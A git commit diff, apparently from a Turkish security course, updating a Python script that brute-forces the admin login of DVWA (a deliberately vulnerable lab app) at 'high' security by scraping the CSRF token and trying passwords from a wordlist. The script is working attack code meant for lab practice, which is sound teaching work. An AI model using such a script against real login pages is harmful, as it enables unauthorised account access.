c4b7ee674d03faf33226655b716ba974c32975bd
Kuday GÖRÜN <kuday.site@gmail.com>
2020-04-04 21:34:28 -0400

    bruteforce kodları güncellendi

--- 1. Ünite/Brute Force/kabaKuvvetSaldirisi.py
+++ 1. Ünite/Brute Force/kabaKuvvetSaldirisi.py
@@ -8,14 +8,15 @@ from bs4 import BeautifulSoup
 
 dosya = open("bestPassword.txt")
 wordlistDosya = dosya.read().split("\n")
-
+sayac = 0
 for i in wordlistDosya:
+	sayac = sayac + 1
 	cookies = {
 		'security': 'high',
-		'PHPSESSID':'ae62c3c9c8a7143de0cd495077a22428'
+		'PHPSESSID':'e9fe385a1b87d7c607ede8f36d1163d0'
 	}
 
-	url = 'http://192.168.182.131/dvwa2/vulnerabilities/brute/index.php'
+	url = 'http://10.0.2.7/dvwa2/vulnerabilities/brute/index.php'
 
 	istek = requests.get(url, cookies=cookies)
 	kaynak_koduParser = BeautifulSoup(istek.content,"lxml")
@@ -25,13 +26,13 @@ for i in wordlistDosya:
 	Örnek bir GET isteği
 	GET /dvwa2/vulnerabilities/brute/index.php?username=admin&password=asd&Login=Login&user_token=6905d0035db25262f4b01ea001cba3d6
 	"""
-	sifreler=i
-	url = "http://192.168.182.131/dvwa2/vulnerabilities/brute/index.php?username=admin&password="+ sifreler +"&Login=Login&user_token="+token
+	denenenSifre=i
+	url = "http://10.0.2.7/dvwa2/vulnerabilities/brute/index.php?username=admin&password="+ denenenSifre +"&Login=Login&user_token="+token
 	istek = requests.get(url, cookies=cookies)
 
 
 	if(str(istek.content).find("Username and/or password incorrect.") == -1):
-		print("\r\n\r\n-------------\r\n[***] Şifre :", i)
+		print("\r\n\r\n-------------\r\n[***] Şifre :", denenenSifre)
 		break
-	print("[*] Denenen ==> ?username=admin&password="+ sifreler +"&Login=Login&user_token="+token)
+	print("[*]["+str(sayac)+"] Denenen ==> ?username=admin&password="+ denenenSifre +"&Login=Login&user_token="+token)
 
